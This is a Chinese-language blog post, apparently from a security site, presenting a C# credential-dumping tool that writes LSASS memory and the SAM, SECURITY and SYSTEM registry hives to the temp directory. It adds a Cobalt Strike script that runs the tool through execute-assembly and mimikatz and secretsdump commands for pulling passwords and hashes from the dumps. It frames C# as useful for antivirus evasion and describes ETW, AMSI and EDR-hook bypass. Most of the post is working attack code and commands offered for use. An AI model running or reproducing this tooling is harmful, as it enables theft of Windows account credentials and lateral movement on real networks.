### 前言

选择 C# 的好处是体积小，结合 loadAssembly 方便免杀。造个轮子，希望各位看客有所帮助。

### 检测权限

因为dump系统lsass内存和sam注册表需要管理员权限，所以首先需要对当前进程上下文权限做判断。

    
    
    public static bool IsHighIntegrity()
    {
                // returns true if the current process is running with adminstrative 
    privs in a high integrity context
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
    

### lsass内存

MiniDumpWriteDump是MS DbgHelp.dll 中一个API,
用于导出当前运行的程序的Dump，利用MiniDumpWriteDump实现dump lsass内存的功能，先加载MiniDumpWriteDump函数。

    
    
    [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", 
    CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, 
    ExactSpelling = true, SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint 
    processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr 
    userStreamParam, IntPtr callbackParam);
    

之后调用函数，并保存dump文件，代码如下所示：

    
    
    namespace sharpdump
    {
        public class MiniDumper
        {
            public static string MiniDump()
            {
                Process[] pLsass = Process.GetProcessesByName("lsass");
                string dumpFile = Path.Combine(Path.GetTempPath(), 
    string.Format("lsass{0}.dmp", pLsass[0].Id));
                if (File.Exists(dumpFile)) File.Delete(dumpFile);
                Console.WriteLine(String.Format("[*] Dumping lsass({0}) to {1}", 
    pLsass[0].Id, dumpFile));
                using (FileStream fs = new FileStream(dumpFile, FileMode.Create, 
    FileAccess.ReadWrite, FileShare.Write))
                {
                    bool bRet = MiniDumpWriteDump(pLsass[0].Handle, (uint)pLsass[0].Id, 
    fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    if (bRet)
                    {
                        Console.WriteLine("[+] Dump successful!");
                        return dumpFile;
                    }
                    else
                    {
                        Console.WriteLine(String.Format("[X] Dump Failed! ErrorCode: 
    {0}", Marshal.GetLastWin32Error()));
                        return null;
                    }
                }
            }
        }
    }
    

### 实现reg save保存sam注册表

首先导入需要用到的API。

    
    
     [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
            public static extern int RegOpenKeyEx(
                UIntPtr hKey,
                string subKey,
                int ulOptions,
                int samDesired,
                out UIntPtr hkResult
            );
    
            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern int RegSaveKey(
                UIntPtr hKey,
                string lpFile,
                IntPtr lpSecurityAttributes
            );
    
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern int RegCloseKey(
                UIntPtr hKey
            );
    

然后构建函数，对"SAM", "SECURITY", "SYSTEM"注册表进行reg save。

    
    
    namespace sharpdump
    {
        internal class Reg
        {
            public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
            public static int KEY_READ = 0x20019;
            public static int KEY_ALL_ACCESS = 0xF003F;
            public static int REG_OPTION_OPEN_LINK = 0x0008;
            public static int REG_OPTION_BACKUP_RESTORE = 0x0004;
            public static int KEY_QUERY_VALUE = 0x1;
            public static void ExportRegKey(string key, string outFile)
            {
                var hKey = UIntPtr.Zero;
                try
                {
                    RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, REG_OPTION_BACKUP_RESTORE | 
    REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS, out hKey); 
    //https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
                    RegSaveKey(hKey, outFile, IntPtr.Zero);
                    RegCloseKey(hKey);
                    Console.WriteLine("Exported HKLM\\{0} at {1}", key, outFile);
                }
                catch (Exception e)
                {
                    throw e;
                }
            }
            public static string DumpReg(string key)
            {
                try
                {
                    String addr = key + ".hiv";
                    addr = Path.Combine(Path.GetTempPath(), addr);
                    ExportRegKey(key, addr);
                    return addr;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    Console.WriteLine(e.StackTrace);
                    return "";
                }
            }
        }
    }
    

文件会被dump到temp目录下，然后对所有dump成功的文件进行打包处理，方便下载。完整代码稍后上传至知识星球。

## 关于ExecuteAssembly

ExecuteAssembly是CS可执行组件的一个替代方案，ExecuteAssembly基于C/C++构建，可以帮助广大研究人员实现.NET程序集的加载和注入。ExecuteAssembly复用了主机进程spawnto来加载CLR模块/AppDomainManager，Stomping加载器/.NET程序集PE
DOS头，并卸载了.NET相关模块，以实现ETW+AMSI绕过。除此之外，它还能够绕过基于NT静态系统调用的EDR钩子，以及通过动态解析API（superfasthash哈希算法）实现隐藏导入。当前metasploit-framework和Cobalt Strike都已经实现了ExecuteAssembly功能，下面主要以Cobalt
Strike为例，实现dump系统lsass内存和sam注册表的功能

## CS 插件

以结合 Cobalt Strike 为例，编写一个简单的cna脚本。

    
    
    popup beacon_bottom {
        menu "Dumper" {
        	item "SharpDump"{
        		local('$bid');
                   foreach $bid ($1){
                       bexecute_assembly($1, script_resource("Dumper.exe"));
                }
        	}
        	item "DownloadDump"{
    			prompt_text("File's address to download", "", lambda({
    				bdownload(@ids, $1);
                }, @ids => $1));
    			
            }
        }
    }
    

加载脚本后，执行SharpDump，结果如下所示：

![image](https://image.3001.net/images/20210622/1624348131_60d195e3a17f5a4c87206.png!small)

下载存放在temp目录下的dump.gz，然后使用Decompress解压，最后使用mimikatz 解密用户lsass.dmp和sam文件

    
    
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
    
    lsadump::sam /sam:sam.hiv /system:system.hiv
    

或者使用 Impacket 的 secretsdump 脚本

https://github.com/SecureAuthCorp/impacket

    
    
    python secretsdump.py -sam SAM.hiv -security SEC -system systemless.txt LOCAL
    

## 参考文章和项目

https://www.cobaltstrike.com/aggressor-script/functions.html  
https://github.com/EncodeGroup/RegSave  
https://shanfenglan.blog.csdn.net/article/details/108149449  
![image](https://image.3001.net/images/20210622/1624348149_60d195f5cb184b3a1ef8a.jpg!small)

